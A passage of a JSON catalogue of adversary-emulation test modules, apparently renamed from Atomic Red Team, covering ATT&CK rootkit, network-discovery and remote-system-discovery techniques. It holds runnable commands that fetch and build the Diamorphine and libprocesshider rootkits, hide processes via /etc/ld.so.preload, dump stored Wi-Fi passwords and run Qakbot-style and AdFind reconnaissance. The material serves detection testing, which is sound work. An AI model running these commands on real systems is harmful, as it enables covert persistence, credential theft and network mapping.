          "install_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;\ncp #{rootkit_source_path}/* /tmp/T1014\ncd /tmp/T1014; make        \nsudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/\n[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014\nsudo depmod -a\n"
        }
      ],
      "rx_module_id": "75483ef8-f10f-444a-bf02-62eb0e48db6f",
      "module_name": "Loadable Kernel Module based Rootkit"
    },
    {
      "index": 76,
      "technique_id": "T1014",
      "technique_name": "Rootkit",
      "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n",
        "elevation_required": true,
        "cleanup_command": "sed -i \"\\:^#{library_path}:d\" /etc/ld.so.preload\nrm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/raglox\n"
      },
      "variables": [
        {
          "name": "repo",
          "description": "Url of the github repo zip",
          "type": "string",
          "default_value": "https://github.com/gianlucaborello/libprocesshider/"
        },
        {
          "name": "rev",
          "description": "Revision of the github repo zip",
          "type": "string",
          "default_value": "25e0587d6bf2137f8792dc83242b6b0e5a72b415"
        },
        {
          "name": "library_path",
          "description": "Full path of the library to add to ld.so.preload",
          "type": "string",
          "default_value": "/usr/local/lib/libprocesshider.so"
        }
      ],
      "prerequisites": [
        {
          "description": "The preload library must exist on disk at specified location (#{library_path})\n",
          "check_command": "if [ -f #{library_path} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "mkdir -p /tmp/raglox && cd /tmp/raglox\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}\nmake\ncp libprocesshider.so #{library_path}\ncp /usr/bin/ping /usr/local/bin/evil_script.py\n"
        }
      ],
      "rx_module_id": "1338bf0c-fd0c-48c0-9e65-329f18e2c0d3",
      "module_name": "dynamic-linker based rootkit (libprocesshider)"
    },
    {
      "index": 77,
      "technique_id": "T1014",
      "technique_name": "Rootkit",
      "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n",
        "elevation_required": true,
        "cleanup_command": "kill -63 1\nsudo modprobe -r #{rootkit_name}\nsudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/raglox\nsudo depmod -a\n"
      },
      "variables": [
        {
          "name": "repo",
          "description": "Url of the diamorphine github repo",
          "type": "string",
          "default_value": "https://github.com/m0nad/Diamorphine/"
        },
        {
          "name": "rev",
          "description": "Revision of the github repo zip",
          "type": "string",
          "default_value": "898810523aa2033f582a4a5903ffe453334044f9"
        },
        {
          "name": "rootkit_name",
          "description": "Module name",
          "type": "string",
          "default_value": "diamorphine"
        }
      ],
      "prerequisites": [
        {
          "description": "The kernel module must exist on disk at specified location (#{rootkit_name}.ko)\n",
          "check_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
          "install_command": "mkdir -p /tmp/raglox && cd /tmp/raglox\ncurl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}\nmake\nsudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n"
        }
      ],
      "rx_module_id": "0b996469-48c6-46e2-8155-a17f8b6c2247",
      "module_name": "Loadable Kernel Module based Rootkit (Diamorphine)"
    },
    {
      "index": 78,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "970ab6a1-0157-4f3f-9a73-ec4166754b23",
      "module_name": "System Network Configuration Discovery on Windows"
    },
    {
      "index": 79,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh advfirewall firewall show rule name=all\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "038263cb-00f4-4b0a-98ae-0696c67e1752",
      "module_name": "List Windows Firewall Rules"
    },
    {
      "index": 80,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "Identify network configuration information.\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "if [ \"$(uname)\" = 'FreeBSD' ]; then cmd=\"netstat -Sp tcp\"; else cmd=\"netstat -ant\"; fi;\nif [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if arp command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "(which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)\n"
        }
      ],
      "rx_module_id": "c141bbdb-7fca-4254-9fd6-f47e79447e17",
      "module_name": "System Network Configuration Discovery"
    },
    {
      "index": 81,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dafaf052-5508-402d-bf77-51e0700c02e2",
      "module_name": "System Network Configuration Discovery (TrickBot Style)"
    },
    {
      "index": 82,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$ports = Get-content \"#{port_file}\"\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -ErrorAction ignore \"#{output_file}\"\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path of file to write port scan results",
          "type": "path",
          "default_value": "$env:USERPROFILE\\Desktop\\open-ports.txt"
        },
        {
          "name": "portfile_url",
          "description": "URL to top-128.txt",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1016/src/top-128.txt"
        },
        {
          "name": "port_file",
          "description": "The path to a text file containing ports to be scanned, one port per line. The default list uses the top 128 ports as defined by Nmap.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1016\\src\\top-128.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Test requires #{port_file} to exist\n",
          "check_command": "if (Test-Path \"#{port_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{port_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"#{portfile_url}\" -OutFile \"#{port_file}\"\n"
        }
      ],
      "rx_module_id": "4b467538-f102-491d-ace7-ed487b853bf5",
      "module_name": "List Open Egress Ports"
    },
    {
      "index": 83,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet) #{optional_args}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "9bb45dd7-c466-4f93-83a1-be30e56033ee",
      "module_name": "Adfind - Enumerate Active Directory Subnet Objects"
    },
    {
      "index": 84,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "A list of commands known to be performed by Qakbot for recon purposes",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{recon_commands}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "recon_commands",
          "description": "File that houses list of commands to be executed",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1016\\src\\qakbot.bat"
        }
      ],
      "prerequisites": [
        {
          "description": "File to copy must exist on disk at specified location (#{recon_commands})\n",
          "check_command": "if (Test-Path \"#{recon_commands}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{recon_commands}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1016/src/qakbot.bat\" -OutFile \"#{recon_commands}\"\n"
        }
      ],
      "rx_module_id": "121de5c6-5818-4868-b8a7-8fd07c455c1b",
      "module_name": "Qakbot Recon"
    },
    {
      "index": 85,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo defaults read /Library/Preferences/com.apple.alf\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ff1d8c25-2aa4-4f18-a425-fede4a41ee88",
      "module_name": "List macOS Firewall Rules"
    },
    {
      "index": 86,
      "technique_id": "T1016",
      "technique_name": "System Network Configuration Discovery",
      "description": "Identify System domain dns controller on an endpoint using nslookup ldap query. This tool is being abused by qakbot malware to gather information on the domain\ncontroller of the targeted or compromised host. reference https://securelist.com/qakbot-technical-analysis/103931/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "34557863-344a-468f-808b-a1bfb89b4fa9",
      "module_name": "DNS Server Discovery Using nslookup"
    },
    {
      "index": 87,
      "technique_id": "T1016.001",
      "technique_name": "System Network Configuration Discovery: Internet Connection Discovery",
      "description": "Check internet connection using ping on Windows. The default target of the ping is 8.8.8.8 (Google Public DNS).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "ping -n 4 #{ping_target}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ping_target",
          "description": "target of the ping",
          "type": "url",
          "default_value": "8.8.8.8"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e184b6bd-fb28-48aa-9a59-13012e33d7dc",
      "module_name": "Check internet connection using ping Windows"
    },
    {
      "index": 88,
      "technique_id": "T1016.001",
      "technique_name": "System Network Configuration Discovery: Internet Connection Discovery",
      "description": "Check internet connection using ping on Linux, MACOS. The default target of the ping is 8.8.8.8 (Google Public DNS).\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "bash",
        "command": "ping -c 4 #{ping_target}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "ping_target",
          "description": "target of the ping",
          "type": "url",
          "default_value": "8.8.8.8"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "be8f4019-d8b6-434c-a814-53123cdcc11e",
      "module_name": "Check internet connection using ping freebsd, linux or macos"
    },
    {
      "index": 89,
      "technique_id": "T1016.001",
      "technique_name": "System Network Configuration Discovery: Internet Connection Discovery",
      "description": "Check internet connection using PowerShell's Test-NetConnection cmdlet and the ICMP/Ping protocol. The default target is 8.8.8.8 (Google Public DNS).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Test-NetConnection -ComputerName #{target}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target",
          "description": "target of the request",
          "type": "string",
          "default_value": "8.8.8.8"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f8160cde-4e16-4c8b-8450-6042d5363eb0",
      "module_name": "Check internet connection using Test-NetConnection in PowerShell (ICMP-Ping)"
    },
    {
      "index": 90,
      "technique_id": "T1016.001",
      "technique_name": "System Network Configuration Discovery: Internet Connection Discovery",
      "description": "Check internet connection using PowerShell's Test-NetConnection cmdlet and the TCP protocol to check for outbound HTTP (Port 80) access. The default target is www.google.com.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Test-NetConnection -CommonTCPPort HTTP -ComputerName #{target}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target",
          "description": "target of the request",
          "type": "string",
          "default_value": "www.google.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7c35779d-42ec-42ab-a283-6255b28e9d68",
      "module_name": "Check internet connection using Test-NetConnection in PowerShell (TCP-HTTP)"
    },
    {
      "index": 91,
      "technique_id": "T1016.001",
      "technique_name": "System Network Configuration Discovery: Internet Connection Discovery",
      "description": "Check internet connection using PowerShell's Test-NetConnection cmdlet and the TCP protocol to check for outbound SMB (Port 445) access. The default target is 8.8.8.8.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Test-NetConnection -CommonTCPPort SMB -ComputerName #{target}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target",
          "description": "target of the request",
          "type": "string",
          "default_value": "8.8.8.8"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d9c32b3b-7916-45ad-aca5-6c902da80319",
      "module_name": "Check internet connection using Test-NetConnection in PowerShell (TCP-SMB)"
    },
    {
      "index": 92,
      "technique_id": "T1016.002",
      "technique_name": "System Network Configuration Discovery: Wi-Fi Discovery",
      "description": "Upon successful execution, information about previously connected Wi-Fi networks will be displayed with their corresponding key (if present).",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh wlan show profile * key=clear",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "53cf1903-0fa7-4177-ab14-f358ae809eec",
      "module_name": "Enumerate Stored Wi-Fi Profiles And Passwords via netsh"
    },
    {
      "index": 93,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net view /domain\nnet view\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "85321a9c-897f-4a60-9f20-29788e50bccd",
      "module_name": "Remote System Discovery - net"
    },
    {
      "index": 94,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net group \"Domain Computers\" /domain\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f1bf6c8f-9016-4edf-aff9-80b65f5d711f",
      "module_name": "Remote System Discovery - net group Domain Computers"
    },
    {
      "index": 95,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "nltest.exe /dclist:#{target_domain}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_domain",
          "description": "Domain to query for domain controllers",
          "type": "string",
          "default_value": "%userdnsdomain%"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "52ab5108-3f6f-42fb-8ba3-73bc054f22c8",
      "module_name": "Remote System Discovery - nltest"
    },
    {
      "index": 96,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "start_host",
          "description": "Last octet starting value for ping sweep.",
          "type": "string",
          "default_value": "1"
        },
        {
          "name": "stop_host",
          "description": "Last octet ending value for ping sweep.",
          "type": "string",
          "default_value": "254"
        },
        {
          "name": "subnet",
          "description": "Subnet used for ping sweep.",
          "type": "string",
          "default_value": "192.168.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6db1f57f-d1d5-4223-8a66-55c9c65a9592",
      "module_name": "Remote System Discovery - ping sweep"
    },
    {
      "index": 97,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "arp -a\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2d5a61f5-0447-4be4-944a-1f8530ed6574",
      "module_name": "Remote System Discovery - arp"
    },
    {
      "index": 98,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "arp -a | grep -v '^?'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if arp command exists on the machine\n",
          "check_command": "if [ -x \"$(command -v arp)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "(which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools)\n"
        }
      ],
      "rx_module_id": "acb6b1ff-e2ad-4d64-806c-6c35fe73b951",
      "module_name": "Remote System Discovery - arp nix"
    },
    {
      "index": 99,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "start_host",
          "description": "Subnet used for ping sweep.",
          "type": "string",
          "default_value": "1"
        },
        {
          "name": "stop_host",
          "description": "Subnet used for ping sweep.",
          "type": "string",
          "default_value": "254"
        },
        {
          "name": "subnet",
          "description": "Subnet used for ping sweep.",
          "type": "string",
          "default_value": "192.168.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "96db2632-8417-4dbb-b8bb-a8b92ba391de",
      "module_name": "Remote System Discovery - sweep"
    },
    {
      "index": 100,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "baa01aaa-5e13-45ec-8a0d-e46c93c9760f",
      "module_name": "Remote System Discovery - nslookup"
    },
    {
      "index": 101,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{venv_path}\\Scripts\\adidnsdump\" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user_name",
          "description": "username including domain.",
          "type": "string",
          "default_value": "domain\\user"
        },
        {
          "name": "acct_pass",
          "description": "Account password.",
          "type": "string",
          "default_value": "password"
        },
        {
          "name": "host_name",
          "description": "hostname or ip address to connect to.",
          "type": "string",
          "default_value": "192.168.1.1"
        },
        {
          "name": "venv_path",
          "description": "Path to the folder for the tactics venv",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\venv_t1018"
        }
      ],
      "prerequisites": [
        {
          "description": "Computer must have python 3 installed\n",
          "check_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
        },
        {
          "description": "Computer must have venv configured at #{venv_path}\n",
          "check_command": "if (Test-Path -Path \"#{venv_path}\" ) { exit 0 } else { exit 1 }\n",
          "install_command": "py -m venv \"#{venv_path}\"\n"
        },
        {
          "description": "adidnsdump must be installed\n",
          "check_command": "if (Get-Command \"#{venv_path}\\Scripts\\adidnsdump\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
          "install_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir adidnsdump 2>&1 | Out-Null\n"
        }
      ],
      "rx_module_id": "95e19466-469e-4316-86d2-1dc401b5a959",
      "module_name": "Remote System Discovery - adidnsdump"
    },
    {
      "index": 102,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer) #{optional_args}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1087.002/bin/AdFind.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
        }
      ],
      "rx_module_id": "a889f5be-2d54-4050-bd05-884578748bb4",
      "module_name": "Adfind - Enumerate Active Directory Computer Objects"
    },
    {
      "index": 103,
      "technique_id": "T1018",
      "technique_name": "Remote System Discovery",
      "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -sc dclist\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "optional_args",
          "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "AdFind.exe must exist on disk at specified location (PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
